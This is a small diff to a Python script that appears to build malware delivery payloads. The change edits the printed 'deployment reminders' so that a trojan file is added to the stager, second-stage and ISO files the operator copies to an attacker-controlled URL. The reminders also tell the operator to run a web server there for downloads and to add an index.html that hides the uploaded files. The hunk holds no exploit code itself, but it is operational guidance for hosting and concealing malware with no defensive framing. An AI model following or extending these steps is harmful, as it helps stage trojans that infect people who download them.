@@ -1192,7 +1192,7 @@ def step8_iso_creation():
     print(f"  {GREEN_DARK}{'─' * 64}{RESET}")
     print(f"  {GREEN_DARK}  DEPLOYMENT REMINDERS:{RESET}")
     print(f"  {GREEN_DARK}{'─' * 64}{RESET}")
-    print(f"  {GREEN_DARK}  ** Copy {SECONDNAME}, {STAGERNAME} and {ISONAME} on {ATTACKER_URL}{RESET}")
+    print(f"  {GREEN_DARK}  ** Copy {SECONDNAME}, {STAGERNAME}, {TROJAN_FE} and {ISONAME} on {ATTACKER_URL}{RESET}")
     print(f"  {GREEN_DARK}     and verify a web server is activated to download them. {RESET}")
     print(f"  {GREEN_DARK}  ** [optional] Copy an index.html file on {ATTACKER_URL}{RESET}")
     print(f"  {GREEN_DARK}     to hide all the files uploaded.{RESET}")
